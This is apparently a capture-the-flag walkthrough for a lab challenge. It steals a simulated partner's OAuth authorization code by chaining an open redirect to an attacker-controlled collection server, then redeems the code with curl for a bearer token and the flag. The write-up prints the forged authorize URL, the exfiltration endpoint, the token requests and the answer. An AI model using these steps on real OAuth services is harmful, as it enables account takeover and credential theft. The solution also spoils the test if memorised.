# Hack to the Future

## Question 1

*In `prehistoric` times, receive this token as a reward for helping your partner `/escape`.*

In the `prehistoric` times, we are tasked with rescuing our partner, which we will need to accomplish by exploiting a vulnerable OAuth server.

From the challenge description, we are told that we can log in to our "time watch" at `https://watch_agent127.pre.pccc` with the credentials `Agent127:password`. Given that we are also told our partner is `Agent404`, let's try and open `https://watch_agent404.pre.pccc` as well. Note that the HTTPS cert is self-signed, so you will receive a "Warning: Potential Security Risk Ahead" message on first access to the hosts for this challenge; simply click "Advanced" and "Accept the Risk and Continue".

![Two Firefox browser windows side by side: the left shows watch_agent127.pre.pccc with an Emergency Camera Feed of a Kali Linux laptop in a jungle, Era: Prehistoric 12,043 BC, with Inter-timensional Chat and Emergency Time Extract buttons; the right shows watch_agent404.pre.pccc with an Emergency Camera Feed of a campfire, the same era and buttons.](imgs/prehistoric-watches.png "Watch sites for both agents")

On the agents, we see a "Camera Feed", and we can see our poor partner is being dangled over a fire! Our camera view shows us in front of our Kali instance. There are some other minor items, but most importantly, there are two available buttons labelled "Inter-timensional Chat" and "Emergency Time Extract".

Let's try the "Emergency Time Extract" on our watch first. Clicking "Emergency Time Extract" takes us to `https://watch_agent127.pre.pccc/escape`, which then redirects us to `https://time_anchor.pre.pccc/login?next=...` (the GET parameters are omitted for now) to log in. Conveniently, our credentials are pre-populated, so you can just hit "Login".

![Firefox browser showing the time_anchor login page at time_anchor.pre.pccc/login, with the username field pre-filled as "Agent127" and the password field showing "password", and a Login button below.](imgs/prehistoric-login.png "Logging in to time_anchor")

After logging in, we are directed to `https://watch_agent127.pre.pccc/escape`, which provides the following JSON:

```json
{
  "claims": {
    "client_id": "watch127",
    "scope": "device.control",
    "sub": "1",
    "username": "Agent127"
  },
  "message": "Whoa whoa whoa! This is YOUR time watch! You can't leave yet! Your partner is still trapped!",
  "ok": false
}
```

This is the `/escape` address that kept being referenced in the challenge description. This is what we need to trigger on our partner's watch for them to escape. 

The final thing for us to check out from the challenge description is the mentioned server `time_device.pre.pccc`. Visiting `https://time_device.pre.pccc/`, the index returns a simple JSON string returning an "OK" status. Given this is returning JSON, let's check `https://time_device.pre.pccc/escape`. Just visiting the URL will give us a "Method Not Allowed" error, so use the following `curl` command to make a POST request, with SSL verification disabled: `curl -X POST -k https://time_device.pre.pccc/escape `.

This returns `{"error":"missing bearer"}`, so this must be the server actually responsible for initiating the escape. Given the error message, our watch host must send an `Authorization` header with a bearer token. This is common in OAuth schemes.

We've now identified where our token is, and now know we need to somehow get a Bearer token for our partner. Let's go back and check out that other button labelled "Inter-timensional Chat". This takes us to `https://watch_agent127.pre.pccc/dm`. Note that if you have *NOT* already logged in, you will be redirected to do so now.

![The Inter-timensional Chat interface at watch_agent127.pre.pccc/dm, showing messages from Agent404 including garbled text ("something wro", "[pl,km]") and a message from Agent127 reading "Emergency extract has been approved, get out of there.", with a message input field and Send button at the bottom.](imgs/prehistoric-dms.png "The direct messages on our time watch")

There are some messages in the chat already, providing some more details on the story. If we type into the chat and hit "Send", we will receive a random string of characters from the right side of the keyboard, as if our partner is smacking their watch and typing random characters. This happens once every about 30 seconds.

![The Inter-timensional Chat at watch_agent127.pre.pccc/dm showing Agent127 sent "Hello?" and Agent404 responded with garbled text "kk;kl.ll", demonstrating that Agent404 is responsive to messages sent in the chat.](imgs/prehistoric-response.png "A response in the watch chat")

Investigating the chat further, either by reviewing the Javascript for the chat site, or by testing, we find that URLs entered in the chat are converted to clickable `<a>` tags. Since it appears like our partner is "clicking" things on the chat, we can try sending them a link to click. First we use `python -m http.server` to start a web server on our Kali device. Next, we use `ip a` to find our IP address. Finally, we can send our IP address like `http://{IP}:8000` in the chat.

![Split view showing the Inter-timensional Chat with a link (http://172.18.0.2:8000) sent to Agent404, alongside a Kali terminal running "ip a" and "python -m http.server". The terminal log shows an incoming GET request from 172.18.0.11, confirming Agent404 clicked the link.](imgs/prehistoric-link_response.png "Our partner clicks a link")

In the logs from the Python web server, we will get a line like `172.18.0.11 - - [16/Jan/2026 23:12:03] "GET / HTTP/1.1" 200 -`, showing that our partner did indeed open the link.

Now that we know we can get some interaction from our partner, let's start investigating the OAuth implementation using Firefox's Developer Tools (note that, unfortunately, Burp Suite's HTTPS proxy fails to handle SSL in this scenario). You can open the network pane directly with `<CTRL+SHIFT+E>`. Using the small gear icon on right, open the settings and enable "Persist Logs" so that we can track the redirects without worrying about clearing the log. Finally, we should restart the log in session by selecting the "Storage" tab, then opening "Cookies", and right-clicking to delete all cookies for the `watch_agent127.pre.pccc` and `time_anchor.pre.pccc` site (note you will need to visit each site to remove the cookies). With all that complete, visit `https://watch_agent127.pre.pccc/escape` to populate the network logs with the redirects performed during the OAuth connection. Note you will need to log back in to the `time_anchor` site.

![Firefox Developer Tools Network tab showing the sequence of HTTP redirects during the OAuth authorization flow, from the initial GET /escape through the time_anchor login and back to the watch callback with the authorization code.](imgs/prehistoric-link_response.png "Using Firefox to track the redirects")

In total, the application performs 8 requests to reach the final `/escape` destination with authorization.

```http
# Step 1 — The watch tries to access protected resource
GET /escape HTTP/1.1
```

```http
# Step 2 — The watch redirects us to start OAuth (app-local “start” endpoint)
# Note the application sets next to /escape, as that is our final destination
GET /start?scope=device.control&next=/escape? HTTP/1.1

scope: device.control
next: /escape?
```

```http
# Step 3 — The watch redirects us to time_anchor, the Authorization Server /oauth/authorize (PKCE)
# This is the first request to the time_anchor
GET /oauth/authorize HTTP/1.1

# The response type lets us know what type of authorization grant we want; in this case, an Authorization Code
response_type: code
# Client ID is the name of the client requesting the token, which has to be preregistered and approved for OAuth
client_id: watch127
# This redirect_uri tells time_anchor where to redirect us to once we have finished auth
redirect_uri: https://watch_agent127.pre.pccc/redirect?next=https%3A%2F%2Fwatch_agent127.pre.pccc%2Fcallback%3Fnext%3D%2Fescape%3F
# The scope is essentially an app-specific label defining a set of actions we are allowed to perform
scope: device.control
# The state is a random value which will be sent back to the watch_127 client to prevent CSRF attacks
state: 5MK3NPtoiIxj3dob
# The code_challenge is a SHA256 hash (base64url encoded) of a secret random value, which will be used to verify our request for a bearer token later. This is PKCE
code_challenge: YfwDQkFY2iHX3ePaF50qvyGRRuNPkeE2YXSuoxMEur0
# The hash method, S256 refers to SHA256
code_challenge_method: S256
```

```http
# Step 4 — Authorization Server (time_anchor) login page
# We are redirected to the login page; once successfully logged in, we will be redirected back to the oauth page for completion
GET /login HTTP/1.1

next: https://time_anchor.pre.pccc/oauth/authorize?response_type=code&client_id=watch127&redirect_uri=https://watch_agent127.pre.pccc/redirect?next%3Dhttps%253A%252F%252Fwatch_agent127.pre.pccc%252Fcallback%253Fnext%253D%252Fescape%253F&scope=device.control&state=5MK3NPtoiIxj3dob&code_challenge=YfwDQkFY2iHX3ePaF50qvyGRRuNPkeE2YXSuoxMEur0&code_challenge_method=S256
```

```http
# Step 5 — Authorization Server (time_anchor) login submit
# This is me manually typing in the username and password, and submitting the log in form
POST /login HTTP/1.1

username: Agent127
password: password
next: https://time_anchor.pre.pccc/oauth/authorize?response_type=code&client_id=watch127&redirect_uri=https://watch_agent127.pre.pccc/redirect?next%3Dhttps%253A%252F%252Fwatch_agent127.pre.pccc%252Fcallback%253Fnext%253D%252Fescape%253F&scope=device.control&state=5MK3NPtoiIxj3dob&code_challenge=YfwDQkFY2iHX3ePaF50qvyGRRuNPkeE2YXSuoxMEur0&code_challenge_method=S256
```

```http
# Step 6 — Authorization request resumes after login
# Same as Step 3, but now processed successfully
GET /oauth/authorize HTTP/1.1

response_type: code
client_id: watch127
redirect_uri: https://watch_agent127.pre.pccc/redirect?next=https%3A%2F%2Fwatch_agent127.pre.pccc%2Fcallback%3Fnext%3D%2Fescape%3F
scope: device.control
state: 5MK3NPtoiIxj3dob
code_challenge: YfwDQkFY2iHX3ePaF50qvyGRRuNPkeE2YXSuoxMEur0
code_challenge_method: S256
```

```http
# Step 7 — Redirect back to the watch with authorization code
# Now we are finally back on the time watch, but now with our OAuth code, and the state (so the watch can check for CSRF)
GET /redirect HTTP/1.1

next: https://watch_agent127.pre.pccc/callback?next=/escape?
code: EinpmfZxLA2ti2KpPDeyiQYlZhu5CNNty9plNNSKCrDknWcZ
state: 5MK3NPtoiIxj3dob
```

```http
# Step 8 — The watch callback receives code + state
# Finally, passed to /callback, which checks the state, and then uses the code to receive a bearer token from time_anchor
GET /callback HTTP/1.1

next: /escape?
code: EinpmfZxLA2ti2KpPDeyiQYlZhu5CNNty9plNNSKCrDknWcZ
state: 5MK3NPtoiIxj3dob
```

```http
# Step 9 — The watch uses the token to make a request to /escape on time_device on our behalf, and returns the results
GET /escape HTTP/1.1
```

While this seems like a lot, that's actually not everything! Up to step 8/9, all of the requests have been made through our browser by redirecting us to various endpoints. There are actually three more requests not shown here as they are made by `watch_agent127.pre.pccc` directly! For the sake of explaining, I've outlined the requests in the collapsed section below. These are not normally available to the competitor, and are not needed for completion, but may help explain the final steps to those new to OAuth. The rest of the guide will continue as if this section was omitted. Finally, a good external explanation for this exact flow can be found here: https://fusionauth.io/articles/oauth/complete-list-oauth-grants#flow-for-authorization-code-grant

<details>

<summary>Final OAuth steps performed by `watch_agent127.pre.pccc` and `time_device.pre.pccc`</summary>

Note that, unlike the following sections, the exact values are not provided, but this should explain the general layout 

```http
# Step 8.5 — The watch retrieves the bearer token from time_anchor
# This occurs inside /callback, before redirecting to /escape 
# This token, which we do not have access to as it passes directly from time_anchor to the watch, is the value actually used for authentication/authorization
POST /oauth/token HTTP/1.1

# We are asking for an authorization_code, as hinted at by the response_type earlier
grant_type: authorization_code
# This is the code we got earlier, showing that the watch was acting on behalf of the user
code: EinpmfZxLA2ti2KpPDeyiQYlZhu5CNNty9plNNSKCrDknWcZ
# Same redirect_uri as before
redirect_uri: https://watch_agent127.pre.pccc/redirect?next=https%3A%2F%2Fwatch_agent127.pre.pccc%2Fcallback%3Fnext%3D%2Fescape%3F
client_id: watch127
# Not logged by the server, so I don't have the exact value, but the SHA256(code_verifier) == code_challenge from Step 3
code_verifier: <random_string>
```

After Step 8.5, the watch now stores our bearer token.

```http
# Step 9.33 — During step 9, the watch connects to time_device with the bearer token in the Authorization header
POST /escape HTTP/1.1

Authorization: Bearer <access_token>
```

```http
# Step 9.66 — The time_device verifies the token with time_anchor by retrieving time_anchor's public key
GET /jwks.json
```

The time_device uses the public key information at `https://time_anchor.pre.pccc/jwks.json` to verify the token. Once verified, it returns the JSON result we saw earlier to `watch_agent127.pre.pccc`, who then returns it to us.

Finally, we have seen the many various requests required to make this OAuth connection work. 

</details>

Looking through these requests, the call to `https://watch_agent127.pre.pccc/redirect?next=` stands out as odd; normally, the `callback` would handle a `next` parameter, if needed, to return the user to where they were. We should investigate this further; if you closed your Python web server, reopen it with `python -m http.server` in a terminal, and then visit `https://watch_agent127.pre.pccc/redirect?next=http://{IP}:8000&test=1` in Firefox, where `{IP}` is replaced with your IP address. Note that the protocol, `http://`, is necessary for the redirect to work. You will be redirected back to your own device, and should still see the `test=1` GET parameter in your URL!

We've now determined that `watch_agent127.pre.pccc` is vulnerable to an Open Redirect Attack. With all of the information we have now, we can now forge an authorization request from `watch_agent404`, send to it Agent404 to click on, redirect the code to us, instead of the callback, and finally, make a request to `https://time_device.pre.pccc/escape` using a bearer token for Agent 404.

First, the forged authorization request. *Note that you will need to do the following steps in quick succession, as the code will expire quickly.* If following along live, you may want to read through the steps entirely first.

```none
https://time_anchor.pre.pccc/oauth/authorize?response_type=code&client_id=watch404&scope=device.control&state=XYZ&code_challenge=WWHTYIjNclXxS69q1gerQ-eTlW5ab1YCpKTorurQ3zw&code_challenge_method=S256&redirect_uri=https://watch_agent404.pre.pccc/redirect?next=http://{IP}:8000/collect

response_type=code
client_id=watch404
scope=device.control
state=XYZ
redirect_uri=https://watch_agent404.pre.pccc/redirect?next=http://{IP}:8000/collect
code_challenge=WWHTYIjNclXxS69q1gerQ-eTlW5ab1YCpKTorurQ3zw
code_challenge_method=S256
```

This request sends the OAuth request we saw before, but instead of redirecting to callback, it redirects back to us. Note you need to manually replace the `{IP}` with your IP address. The `code_challenge` was generated using the following commands:

```bash
echo -n '1234567890123456789012345678901234567890123' \
| openssl dgst -sha256 -binary \
| openssl base64 -A \
| tr '+/' '-_' \
| tr -d '='
```

Now to start the attack, we will send the URL in the chat, and wait for our partner to click it. They are already logged in (since they have access to the chat), so they will not be prompted to log in, and the code will be redirected to us through the Open Redirect Attack. Once again, be sure your Python `http.server` is running to catch the incoming request!

In this case, the code was `rc2UtGJxUXDEL86T896HuwknbWvfkONjbh8iQfL6yFfEwuuA`. Your code will be different.

![Firefox browser showing the Inter-timensional Chat with the forged OAuth authorization URL sent as a clickable link to Agent404, alongside a terminal running "python -m http.server". The terminal log shows an incoming GET request to /collect containing the OAuth authorization code and state=XYZ, confirming the code was redirected to the attacker's server via the open redirect vulnerability.](imgs/prehistoric-code.png "Retrieving the OAuth code")

Now we will use the code to get a bearer token with the following `curl` command. While this was not leaked to us, this is just the standard format and most common endpoint for OAuth: https://fusionauth.io/articles/oauth/complete-list-oauth-grants#flow-for-authorization-code-grant. You will need to replace both your `{IP}` and `{CODE}`.

```bash
curl -k -sS -X POST https://time_anchor.pre.pccc/oauth/token \
  -d grant_type=authorization_code \
  -d client_id=watch404 \
  -d redirect_uri='https://watch_agent404.pre.pccc/redirect?next=http://{IP}:8000/collect' \
  -d code='{CODE}' \
  -d code_verifier='1234567890123456789012345678901234567890123'
```

The response should be JSON like the following, including the Bearer Token (you might recognize it as a JSON Web Token):

```json
{"access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImFuY2hvci1rZXktMSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL3RpbWVfYW5jaG9yLnByZS5wY2NjIiwic3ViIjoiMiIsImF1ZCI6InRpbWVfZGV2aWNlIiwiaWF0IjoxNzY4NjkwMTc3LCJleHAiOjE3Njg2OTEwNzcsInNjb3BlIjoiZGV2aWNlLmNvbnRyb2wiLCJjbGllbnRfaWQiOiJ3YXRjaDQwNCIsInVzZXJuYW1lIjoiQWdlbnQ0MDQifQ.JlR-PrFNeMrWO2_SbjFGwygT5tvEwFXeyFJn7NgmXNAt8Ssskb-HH50kt9Chj2ACmDm9R6MKFhbzdVINBPDsTBlOm7Q7vwRtDHL_GHSvSeIclmdnvfipfLYR8uOQgB59MzjQtIOI2jJGtHIuhnZSSiHTBMBnbiQd41JYKWuHEly1GN3a4weEYc3HJcLpq0py_G7AhdCK_zi47xJWu9HTTybeXvY11Td4a6WQS45I8ssRb5zKf1pEgipmfyRx-LQxJ7Sg5JkxXFQ1nKyue9W2NmGI49KTkWm6vQUdNe7-D4MZHGXedz8VI-yWC0w5Ea_-29lO0gBd5hi_pFgSOXA_OQ", "expires_in": 864000, "scope": "device.control", "token_type": "Bearer"}
```

The last step is to just use the token to call `https://time_device.pre.pccc/escape`, replacing `{TOKEN}` with your Bearer Token.

```bash
curl -k -sS -X POST https://time_device.pre.pccc/escape -H "Authorization: Bearer {TOKEN}"
```

![Kali terminal showing two curl commands: the first POSTs to time_anchor.pre.pccc/oauth/token with the authorization code and code_verifier, receiving back a JSON response containing a Bearer access token; the second POSTs to time_device.pre.pccc/escape with that token in the Authorization header, returning JSON with the challenge_token "PCCC{Out_of_the_fire}" and ok:true.](imgs/prehistoric-token.png "Retrieving and using the bearer token")

You will receive JSON output like the following:

```json
{"challenge_token":"PCCC{Out_of_the_fire}","claims":{"client_id":"watch404","scope":"device.control","sub":"2","username":"Agent404"},"message":"You hear cavemen screaming in the distance, no doubt shocked by the sudden flash of the time device tearing reality... and the loss of their supper! Time for you to extract as well.","ok":true}
```

### Answer

In this case, the token was `PCCC{Out_of_the_fire}`.